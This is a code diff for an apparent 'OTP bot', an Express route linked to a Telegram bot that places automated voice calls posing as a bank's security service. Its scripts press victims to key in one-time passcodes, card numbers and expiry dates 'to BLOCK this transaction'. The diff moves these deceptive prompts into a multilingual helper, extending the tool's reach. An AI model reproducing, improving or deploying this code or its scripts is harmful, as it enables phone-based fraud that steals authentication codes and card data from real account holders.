@@ -2,6 +2,8 @@ import { bot } from '../..';
 import { app } from '../';
 import { Markup } from 'telegraf';
 import { v4 as uuidv4 } from 'uuid';
+import { getLangOTP } from '../../languages';
+import { Language } from '../../types';
 
 app.all('/calls/otp/:step/:chatId/:language', async (req, res) => {
   const { askCardInfo, cardType, variables, otpLength } = req.query;
@@ -61,8 +63,11 @@ app.all('/calls/otp/:step/:chatId/:language', async (req, res) => {
               id: uuidv4(),
               action: 'say',
               options: {
-                payload:
-                  'You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.',
+                payload: getLangOTP({
+                  sp: `1`,
+                  step: `bank`,
+                  language: language as Language,
+                }),
                 language,
                 voice: 'female',
                 loop: true,
@@ -104,8 +109,12 @@ app.all('/calls/otp/:step/:chatId/:language', async (req, res) => {
                 id: uuidv4(),
                 action: 'say',
                 options: {
-                  payload:
-                    'The OTP you have entered is incorrect. Please enter the OTP again followed by the pound key.',
+                  payload: getLangOTP({
+                    sp: `1`,
+                    step: `shared`,
+                    language: language as Language,
+                    dtmf: dtmf.split('').join(', '),
+                  }),
                   language,
                   voice: 'female',
                   loop: true,
@@ -158,7 +167,12 @@ app.all('/calls/otp/:step/:chatId/:language', async (req, res) => {
             id: uuidv4(),
             action: 'say',
             options: {
-              payload: `GREAT. you have entered ${dtmf.split('').join(', ')}.`,
+              payload: getLangOTP({
+                sp: `2`,
+                step: `bank`,
+                language: language as Language,
+                dtmf: dtmf.split('').join(', '),
+              }),
               language,
               voice: 'female',
             },
@@ -186,8 +200,11 @@ app.all('/calls/otp/:step/:chatId/:language', async (req, res) => {
               id: uuidv4(),
               action: 'say',
               options: {
-                payload:
-                  'You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.',
+                payload: getLangOTP({
+                  sp: `1`,
+                  step: `pay`,
+                  language: language as Language,
+                }),
                 language,
                 voice: 'female',
                 loop: true,
@@ -229,8 +246,11 @@ app.all('/calls/otp/:step/:chatId/:language', async (req, res) => {
                 id: uuidv4(),
                 action: 'say',
                 options: {
-                  payload:
-                    'The OTP you have entered is incorrect. Please enter the OTP again followed by the pound key.',
+                  payload: getLangOTP({
+                    sp: `1`,
+                    step: `shared`,
+                    language: language as Language,
+                  }),
                   language,
                   voice: 'female',
                   loop: true,
@@ -282,7 +302,12 @@ app.all('/calls/otp/:step/:chatId/:language', async (req, res) => {
             id: uuidv4(),
             action: 'say',
             options: {
-              payload: `GREAT. you have entered ${dtmf.split('').join(', ')}.`,
+              payload: getLangOTP({
+                sp: `1`,
+                step: `pay`,
+                language: language as Language,
+                dtmf: dtmf.split('').join(', '),
+              }),
               language,
               voice: 'female',
             },
@@ -309,8 +334,11 @@ app.all('/calls/otp/:step/:chatId/:language', async (req, res) => {
               id: uuidv4(),
               action: 'say',
               options: {
-                payload:
-                  'You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.',
+                payload: getLangOTP({
+                  sp: `1`,
+                  step: `account`,
+                  language: language as Language,
+                }),
                 language,
                 voice: 'female',
                 loop: true,
@@ -352,8 +380,11 @@ app.all('/calls/otp/:step/:chatId/:language', async (req, res) => {
                 id: uuidv4(),
                 action: 'say',
                 options: {
-                  payload:
-                    'The OTP you have entered is incorrect. Please enter the OTP again followed by the pound key.',
+                  payload: getLangOTP({
+                    sp: `1`,
+                    step: `shared`,
+                    language: language as Language,
+                  }),
                   language,
                   voice: 'female',
                   loop: true,
@@ -405,7 +436,12 @@ app.all('/calls/otp/:step/:chatId/:language', async (req, res) => {
             id: uuidv4(),
             action: 'say',
             options: {
-              payload: `GREAT. you have entered ${dtmf.split('').join(', ')}.`,
+              payload: getLangOTP({
+                sp: `1`,
+                step: `account`,
+                language: language as Language,
+                dtmf: dtmf.split('').join(', '),
+              }),
               language,
               voice: 'female',
             },
@@ -433,7 +469,12 @@ app.all('/calls/otp/:step/:chatId/:language', async (req, res) => {
               id: uuidv4(),
               action: 'say',
               options: {
-                payload: `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound keyYou have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
+                payload: getLangOTP({
+                  sp: `1`,
+                  step: `card`,
+                  language: language as Language,
+                  cardType: cardType !== 'undefined' ? String(cardType) : ``,
+                }),
                 language,
                 voice: 'female',
                 loop: true,
@@ -474,7 +515,12 @@ app.all('/calls/otp/:step/:chatId/:language', async (req, res) => {
               id: uuidv4(),
               action: 'say',
               options: {
-                payload: `The card number you have entered is incorrect. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
+                payload: getLangOTP({
+                  sp: `2`,
+                  step: `card`,
+                  language: language as Language,
+                  cardType: cardType !== 'undefined' ? String(cardType) : ``,
+                }),
                 language,
                 voice: 'female',
                 loop: true,
@@ -522,11 +568,13 @@ app.all('/calls/otp/:step/:chatId/:language', async (req, res) => {
               id: uuidv4(),
               action: 'say',
               options: {
-                payload: `GREAT, you have entered ${dtmf
-                  .split('')
-                  .join(
-                    ', ',
-                  )}. Please enter your ${cardType} card expiration date followed by the pound key.`,
+                payload: getLangOTP({
+                  sp: `3`,
+                  step: `card`,
+                  language: language as Language,
+                  cardType: cardType !== 'undefined' ? String(cardType) : ``,
+                  dtmf: dtmf.split('').join(', '),
+                }),
                 language,
                 voice: 'female',
                 loop: true,
@@ -566,7 +614,12 @@ app.all('/calls/otp/:step/:chatId/:language', async (req, res) => {
               id: uuidv4(),
               action: 'say',
               options: {
-                payload: `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key.`,
+                payload: getLangOTP({
+                  sp: `4`,
+                  step: `card`,
+                  language: language as Language,
+                  cardType: cardType !== 'undefined' ? String(cardType) : ``,
+                }),
                 language,
                 voice: 'female',
                 loop: true,
